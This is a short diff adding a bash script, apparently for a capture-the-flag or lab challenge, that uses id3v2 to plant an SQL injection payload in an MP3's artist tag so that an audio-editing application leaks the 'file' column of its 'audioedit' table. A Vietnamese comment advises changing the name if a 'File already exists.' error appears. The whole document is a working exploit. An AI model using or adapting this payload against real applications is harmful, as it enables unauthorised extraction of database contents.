@@ -1,0 +1,3 @@
+#!/bin/bash
+id3v2 -a "longle',(SELECT GROUP_CONCAT(file) FROM audioedit as tmp)) -- ##; " -t "hacking 123456" file_example_MP3_700KB.mp3
+# hay doi longle thanh ten khac neu co loi 'File already exists.'
